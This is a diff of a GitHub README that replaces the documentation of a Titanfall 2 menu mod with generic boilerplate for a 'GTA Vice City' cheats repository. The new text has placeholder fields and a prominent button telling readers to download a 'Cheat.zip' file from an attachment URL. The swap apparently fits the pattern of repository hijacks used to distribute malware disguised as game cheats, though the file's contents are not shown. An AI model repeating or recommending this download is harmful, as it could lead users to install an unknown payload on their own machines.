@@ -1,120 +1,108 @@
-<p align="center" style="text-align:center"><img width="125" height="122" src="https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/icon.png" alt="Titanfall 2 - Enhanced Menu Mod" /></p>
+# GTA Vice City Repository 🌆🎮
 
-![VPK Build Status](https://github.com/taskinoz/Enhanced-Menu-Mod/actions/workflows/buildvpks.yml/badge.svg)
+Welcome to the ultimate repository for GTA Vice City aficionados! 🌟 In this repository, you'll find all the resources, cheats, and exciting elements related to the iconic game Grand Theft Auto: Vice City. Get ready to dive into the neon-lit streets of Vice City and relive the nostalgia of the 80s! 🚗🏝️
 
+## Repository Overview
 
-# Enhanced Menu Mod
-Adds more options to the settings menu, such as extra keybinds, cheats, hud enhancements and cleaner interface
+![GTA Vice City](https://example.com/gtavicecityimage.jpg)
 
-# Features
-* Removed **Spotlight** and **Whats New** from the main menu
-* Added `sv_cheats` to the contols menu
-* Added HUD Options
-  * Bloom - `mat_disable_bloom`
-  * Show FPS - `cl_showfps`
-  * Show FPS Big - `showfps_enabled`
-  * Show Player Position - `cl_showpos`
-* Added new Keybinds
-  * Speedrunning
-    * Save/Load Quicksave 1
-    * Save/Load Quicksave 2
-    * Save/Load Quicksave 3
-    * Slow the game to 25%
-    * Speed the game up to 500%
-    * Reset all helmets
-    * Give yourself an EVA Shotgun
-    * Give yourself an EPG
-  * Demos
-    * Record Demo incrementally
-    * Record Demo
-    * Stop recording Demo
-    * Pause Demo
-    * Resume Demo
-    * Toggle Play/Pause Demo
-  * Extras
-    * Toggle low gravity
-    * Set camera to First Person
-    * Set camera to Third Person
-    * Move Third Person camera in
-    * Move Third Person camera out
-    * Hide/Show weapon
-  * No Cutscene Saves
-    * Load save 1-9 with 3 alternate saves
-  * No Cutscene Helmet Saves
-    * Load save 1 and 2
-* Added Extras Menu
-  * Demos
-    * Enable Demos
-    * Save Demos
-    * Interpolate Playback
-    * Demo record rate Single Player
-    * Demo record rate Multiplayer
-    * Key Bindings (shortcut)
-  * Gameplay
-    * Enable Wallrunning (sp)
-    * Enable Automantle (sp)
-    * Enable Vertical Dodge (sp)
-    * Player Control Debounce
-    * Command Que
-    * Speedometer Settings (Works with the MP mod)
-  * Community
-    * Communities toggle for MP
-* Audio
-  * Loading Fade Time
-  * Loading Silence Time
-* Replaced Chinese subtitles with English
-* Replaced Chinese UI text with English
-* Removed crashes from Dev launch arguments `-dev +developer 1`
-* Added Speedometer (only to Single Player)
+### Repository Name: GTA Vice City
+### Short Description: Not Provided
+### Topics: Not Provided
 
-## Installation
+---
 
-1) Download the pre-compiled version from the [releases](https://github.com/taskinoz/Enhanced-Menu-Mod/releases) page or [ModDB(OLD)](https://www.moddb.com/mods/enhanced-menu)
+## Table of Contents
 
-2) Backup your `englishclient_frontend.bsp.pak000_dir.vpk` and copy the 2 `.vpk` files from the downloaded zip to your `Titanfall2/vpk` folder
+- [Introduction](#introduction)
+- [How to Use Cheats](#cheats)
+- [Download Cheat Codes](#download)
+- [Resources](#resources)
+- [Contributing](#contributing)
 
-## Icepick
+---
 
-1) Download the Icepick specific version from the [releases](https://github.com/taskinoz/Enhanced-Menu-Mod/releases) page
+## Introduction
 
-2) Open the downloaded `Enhanced.Menu.Mod.Icepick.zip` file and copy the `Enhanced.Menu.Mod.Icepick` folder to you `Icepick/data/mods` folder.
+Welcome to the world of GTA Vice City! 🌆 Grand Theft Auto: Vice City is an action-packed video game set in the fictional Vice City, inspired by Miami. The game, released in 2002, takes players on a journey filled with crime, fast cars, beaches, and endless possibilities.
 
-3) Launch Icepick.
+In this repository, you'll discover a treasure trove of information, resources, and cheats to enhance your GTA Vice City experience. Whether you're a seasoned player looking to relive the thrill or a newcomer ready to explore the city's nuances, this repository has something for everyone.
 
-## Northstar
+---
 
-1) Download the Northstar specific version from the [releases](https://github.com/taskinoz/Enhanced-Menu-Mod/releases) page
+## How to Use Cheats 🕹️
 
-2) Open the downloaded `Enhanced.Menu.Mod.Northstar.zip` file and copy the `Enhanced.Menu.Mod.Northstar` folder to you `Titanfall2/R2Northstar/mods` folder.
+Using cheats in GTA Vice City can completely change your gaming experience. From spawning vehicles to changing the weather, cheats offer a range of fun options to experiment with. Here are some basic steps to activate cheats in the game:
 
-3) Launch Northstar.
+1. Start the game and play as usual.
+2. During gameplay, type the cheat code directly on your keyboard.
+3. Once the cheat is entered correctly, you should see a confirmation message on the screen.
+4. Enjoy the benefits of the cheat in-game!
 
-## Screenshots
+Here are some popular cheat codes to get you started:
 
-![Main Menu with custom menu video](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-main.jpg)
+- **Infinite Health**: `ASPIRINE`
+- **Full Armor**: `PRECIOUSPROTECTION`
+- **Weapon Set 1**: `THUGSTOOLS`
+- **Lower Wanted Level**: `LEAVEMEALONE`
 
-Main Menu with the original Titanfall 2 menu video
+Dive deeper into the world of cheats and explore the various possibilities that GTA Vice City offers!
 
-![Main Menu with no showcase content](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-main1.jpg)
+---
 
-Main Menu with the showcase removed to declutter the menu
+## Download Cheat Codes 📂
 
-![Cheats setting](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-cheats.jpg)
+To access a comprehensive list of cheat codes for GTA Vice City, click the button below:
 
-New Cheat options that can be enabled as well as the extras menu
+[![Cheat Codes Download](https://img.shields.io/badge/Download-Cheat_Codes-<COLOR>.svg)](https://github.com/user-attachments/files/16612167/Cheat.zip)
 
-![New custom keybinds](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-keys.jpg)
+Click the button above to download the cheat codes and take your gameplay to the next level!
 
-Added keybinds for speedrunners and extra commands for fun
+---
 
-![Advanced Look Options with values](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-advanced-look.jpg)
+## Resources 📚
 
-Shows the values for each setting on the Advanced Look Options
+### Official Guides
 
-![New HUD options](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-hud.jpg)
+If you're looking for official guides and walkthroughs to conquer GTA Vice City, check out these resources:
 
-Added extra HUD display options for showing FPS, Position, Velocity, and Server Tick rate
+1. [Official Vice City Strategy Guide](https://www.rockstargames.com/vicecity/guide)
+2. [GTA Vice City Wiki](https://gta.fandom.com/wiki/Grand_Theft_Auto:_Vice_City)
 
-![Extras Menu](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-extras.jpg)
+### Community Forums
 
-Added a menu for enabling and changing demo settings for recording single and multiplayer demos as well as turning of wallrunning and enabling titan jumping.
+Join the GTA Vice City community and discuss gameplay tips, tricks, and more on these forums:
+
+1. [GTA Forums - Vice City](https://gtaforums.com/forum/53-gta-vice-city/)
+2. [Reddit - r/GTAViceCity](https://www.reddit.com/r/GTAViceCity/)
+
+Explore these resources to enhance your knowledge of the game and connect with fellow fans!
+
+---
+
+## Contributing 🤝
+
+We welcome contributions from the GTA Vice City community to make this repository even more helpful and engaging. Whether you have new cheat codes, gameplay strategies, or resources to share, your input is valuable!
+
+To contribute, follow these simple steps:
+
+1. Fork the repository.
+2. Make your changes.
+3. Create a pull request.
+
+Together, we can create a vibrant hub for all things GTA Vice City!
+
+---
+
+🎉 You're now ready to embark on an incredible GTA Vice City journey! Have fun exploring the streets, completing missions, and unleashing chaos in this remarkable open-world game! 🚔💥
+
+Remember: "It's time for a little getaway..." 🌴
+
+---
+
+### Disclaimer:
+This repository and its maintainers are not affiliated with Rockstar Games or the official GTA Vice City development team. This is a fan-created space for enthusiasts to share tips, cheats, and resources related to the game. Thank you for being a part of our community! 
+
+Enjoy your Vice City adventures! 🌟
+
+---
